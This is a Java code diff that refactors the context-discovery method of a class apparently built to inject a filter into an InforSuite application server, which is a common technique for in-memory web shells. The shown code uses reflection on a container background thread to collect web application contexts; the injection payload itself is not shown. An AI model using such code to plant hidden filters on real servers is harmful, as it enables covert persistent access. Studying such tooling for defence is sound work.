@@ -6,10 +6,7 @@ import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 import java.util.logging.Logger;
 import java.util.zip.GZIPInputStream;
 
@@ -49,18 +46,13 @@ public class InforSuiteFilterInjector {
 
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
+        Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
                 Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
-                for (Object key : childrenMap.keySet()) {
-                    Map<?, ?> children = (Map<?, ?>) getFieldValue(childrenMap.get(key), "children");
-                    for (Object key1 : children.keySet()) {
-                        Object context = children.get(key1);
-                        if (context != null) {
-                            contexts.add(context);
-                        }
-                    }
+                for (Object value : childrenMap.values()) {
+                    HashMap<?, ?> children = (HashMap<?, ?>) getFieldValue(value, "children");
+                    contexts.addAll(children.values());
                 }
             }
         }
